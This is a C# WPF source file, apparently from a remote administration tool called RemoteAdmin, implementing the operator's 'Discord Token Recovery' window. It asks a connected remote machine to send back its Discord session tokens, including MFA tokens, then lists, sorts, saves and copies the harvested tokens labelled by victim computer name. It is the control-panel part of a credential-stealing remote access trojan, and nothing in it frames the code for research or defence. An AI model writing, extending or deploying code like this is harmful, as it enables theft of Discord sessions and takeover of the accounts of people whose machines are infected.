using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using RemoteAdmin.Shared;

namespace RemoteAdmin.Server
{
    /// <summary>
    /// Interaction logic for DiscordTokenWindow.xaml
    /// </summary>
    public partial class DiscordTokenWindow : Window
    {
        private readonly ConnectedClient _client;
        private GridViewColumnHeader _lastHeaderClicked = null;
        private ListSortDirection _lastDirection = ListSortDirection.Ascending;

        public DiscordTokenWindow(ConnectedClient client)
        {
            InitializeComponent();
            _client = client;

            // Update window title with client info
            Title = $"Discord Token Recovery [{_client.ComputerName}]";

            // Store reference in client
            _client.DiscordTokenWindow = this;

            // Load tokens when window opens
            Loaded += DiscordTokenWindow_Loaded;
            Closing += DiscordTokenWindow_Closing;
        }

        private async void DiscordTokenWindow_Loaded(object sender, RoutedEventArgs e)
        {
            // Request token recovery from client
            await RequestTokenRecovery();
        }

        private void DiscordTokenWindow_Closing(object sender, CancelEventArgs e)
        {
            // Clear reference in client
            _client.DiscordTokenWindow = null;
        }

        public async System.Threading.Tasks.Task RequestTokenRecovery()
        {
            try
            {
                if (_client?.Stream == null)
                {
                    MessageBox.Show("Client is not connected.", "Error",
                        MessageBoxButton.OK, MessageBoxImage.Error);
                    return;
                }

                var request = new TokenMessage();
                await Shared.NetworkHelper.SendMessageAsync(_client.Stream, request);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to request token recovery: {ex.Message}",
                    "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        public void UpdateTokenList(string tokensData)
        {
            lstTokens.Items.Clear();

            if (string.IsNullOrWhiteSpace(tokensData))
            {
                Title = $"Discord Token Recovery [{_client.ComputerName}] - No tokens found";
                return;
            }

            // Parse the tokens data
            var tokens = ParseTokens(tokensData);

            foreach (var token in tokens)
            {
                lstTokens.Items.Add(token);
            }

            // Update window title with count
            Title = $"Discord Token Recovery [{_client.ComputerName}] - {tokens.Count} token(s)";
        }

        private List<DiscordTokenItem> ParseTokens(string tokensData)
        {
            var tokens = new List<DiscordTokenItem>();
            var lines = tokensData.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);

            foreach (var line in lines)
            {
                var trimmedLine = line.Trim();
                if (string.IsNullOrWhiteSpace(trimmedLine))
                    continue;

                // Try to parse token format
                // Assuming format might be like: "Token: xxx Type: xxx UserId: xxx"
                // Or just raw tokens
                var token = new DiscordTokenItem();

                if (trimmedLine.Contains(":"))
                {
                    // Parse structured format
                    var parts = trimmedLine.Split(new[] { '|', ';', '\t' }, StringSplitOptions.RemoveEmptyEntries);
                    foreach (var part in parts)
                    {
                        var keyValue = part.Split(new[] { ':' }, 2);
                        if (keyValue.Length == 2)
                        {
                            var key = keyValue[0].Trim().ToLower();
                            var value = keyValue[1].Trim();

                            switch (key)
                            {
                                case "token":
                                    token.Token = value;
                                    break;
                                case "type":
                                    token.TokenType = value;
                                    break;
                                case "userid":
                                case "user id":
                                    token.UserId = value;
                                    break;
                                case "status":
                                    token.Status = value;
                                    break;
                            }
                        }
                    }

                    // If token is still empty, use the whole line
                    if (string.IsNullOrWhiteSpace(token.Token))
                    {
                        token.Token = trimmedLine;
                        token.TokenType = "Unknown";
                        token.Status = "Unchecked";
                    }
                }
                else
                {
                    // Raw token
                    token.Token = trimmedLine;
                    token.TokenType = DetectTokenType(trimmedLine);
                    token.Status = "Unchecked";
                }

                tokens.Add(token);
            }

            return tokens;
        }

        private string DetectTokenType(string token)
        {
            if (string.IsNullOrWhiteSpace(token))
                return "Unknown";

            // Discord token patterns
            if (token.StartsWith("mfa."))
                return "MFA";
            else if (token.Length > 50 && token.Contains("."))
                return "User Token";
            else
                return "Unknown";
        }

        // Sorting functionality
        private void ListView_ColumnHeaderClick(object sender, RoutedEventArgs e)
        {
            var headerClicked = e.OriginalSource as GridViewColumnHeader;
            ListSortDirection direction;

            if (headerClicked != null && headerClicked.Role != GridViewColumnHeaderRole.Padding)
            {
                if (headerClicked != _lastHeaderClicked)
                {
                    direction = ListSortDirection.Ascending;
                }
                else
                {
                    direction = _lastDirection == ListSortDirection.Ascending
                        ? ListSortDirection.Descending
                        : ListSortDirection.Ascending;
                }

                var columnBinding = headerClicked.Column.DisplayMemberBinding as Binding;
                var sortBy = columnBinding?.Path.Path ?? headerClicked.Column.Header as string;

                Sort(sortBy, direction);

                _lastHeaderClicked = headerClicked;
                _lastDirection = direction;
            }
        }

        private void Sort(string sortBy, ListSortDirection direction)
        {
            var dataView = CollectionViewSource.GetDefaultView(lstTokens.Items);
            dataView.SortDescriptions.Clear();
            var sd = new SortDescription(sortBy, direction);
            dataView.SortDescriptions.Add(sd);
            dataView.Refresh();
        }

        // Context menu handlers
        private void SaveAll_Click(object sender, RoutedEventArgs e)
        {
            SaveTokens(lstTokens.Items.Cast<DiscordTokenItem>().ToList());
        }

        private void SaveSelected_Click(object sender, RoutedEventArgs e)
        {
            var selected = lstTokens.SelectedItems.Cast<DiscordTokenItem>().ToList();
            if (selected.Count == 0)
            {
                MessageBox.Show("No items selected.", "Information",
                    MessageBoxButton.OK, MessageBoxImage.Information);
                return;
            }
            SaveTokens(selected);
        }

        private void CopyAll_Click(object sender, RoutedEventArgs e)
        {
            CopyToClipboard(lstTokens.Items.Cast<DiscordTokenItem>().ToList());
        }

        private void CopySelected_Click(object sender, RoutedEventArgs e)
        {
            var selected = lstTokens.SelectedItems.Cast<DiscordTokenItem>().ToList();
            if (selected.Count == 0)
            {
                MessageBox.Show("No items selected.", "Information",
                    MessageBoxButton.OK, MessageBoxImage.Information);
                return;
            }
            CopyToClipboard(selected);
        }

        private void ClearAll_Click(object sender, RoutedEventArgs e)
        {
            var result = MessageBox.Show(
                "Are you sure you want to clear all recovered tokens?",
                "Confirm Clear",
                MessageBoxButton.YesNo,
                MessageBoxImage.Question);

            if (result == MessageBoxResult.Yes)
            {
                lstTokens.Items.Clear();
                Title = $"Discord Token Recovery [{_client.ComputerName}]";
            }
        }

        private void ClearSelected_Click(object sender, RoutedEventArgs e)
        {
            var selected = lstTokens.SelectedItems.Cast<DiscordTokenItem>().ToList();
            if (selected.Count == 0)
            {
                MessageBox.Show("No items selected.", "Information",
                    MessageBoxButton.OK, MessageBoxImage.Information);
                return;
            }

            foreach (var item in selected)
            {
                lstTokens.Items.Remove(item);
            }

            Title = $"Discord Token Recovery [{_client.ComputerName}] - {lstTokens.Items.Count} token(s)";
        }

        private async void Refresh_Click(object sender, RoutedEventArgs e)
        {
            lstTokens.Items.Clear();
            await RequestTokenRecovery();
        }

        // Helper methods
        private void SaveTokens(List<DiscordTokenItem> items)
        {
            if (items.Count == 0)
            {
                MessageBox.Show("No tokens to save.", "Information",
                    MessageBoxButton.OK, MessageBoxImage.Information);
                return;
            }

            var saveFileDialog = new Microsoft.Win32.SaveFileDialog
            {
                Filter = "Text files (*.txt)|*.txt|All files (*.*)|*.*",
                FileName = $"DiscordTokens_{_client.ComputerName}_{DateTime.Now:yyyyMMdd_HHmmss}.txt",
                DefaultExt = "txt"
            };

            if (saveFileDialog.ShowDialog() == true)
            {
                try
                {
                    var format = txtFormat.Text;
                    var lines = items.Select(item => FormatTokenLine(item, format));
                    File.WriteAllLines(saveFileDialog.FileName, lines);

                    MessageBox.Show(
                        $"Successfully saved {items.Count} token(s) to:\n{saveFileDialog.FileName}",
                        "Success",
                        MessageBoxButton.OK,
                        MessageBoxImage.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Failed to save tokens: {ex.Message}",
                        "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
        }

        private void CopyToClipboard(List<DiscordTokenItem> items)
        {
            if (items.Count == 0)
            {
                MessageBox.Show("No tokens to copy.", "Information",
                    MessageBoxButton.OK, MessageBoxImage.Information);
                return;
            }

            try
            {
                var format = txtFormat.Text;
                var lines = items.Select(item => FormatTokenLine(item, format));
                var text = string.Join(Environment.NewLine, lines);

                Clipboard.SetText(text);

                MessageBox.Show(
                    $"Successfully copied {items.Count} token(s) to clipboard.",
                    "Success",
                    MessageBoxButton.OK,
                    MessageBoxImage.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to copy to clipboard: {ex.Message}",
                    "Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        private string FormatTokenLine(DiscordTokenItem item, string format)
        {
            return format
                .Replace("TOKEN", item.Token ?? "")
                .Replace("TYPE", item.TokenType ?? "")
                .Replace("USERID", item.UserId ?? "")
                .Replace("STATUS", item.Status ?? "");
        }
    }

    // Helper class for displaying tokens in the ListView
    public class DiscordTokenItem
    {
        public string Token { get; set; }
        public string TokenType { get; set; }
        public string UserId { get; set; }
        public string Status { get; set; }
    }
}
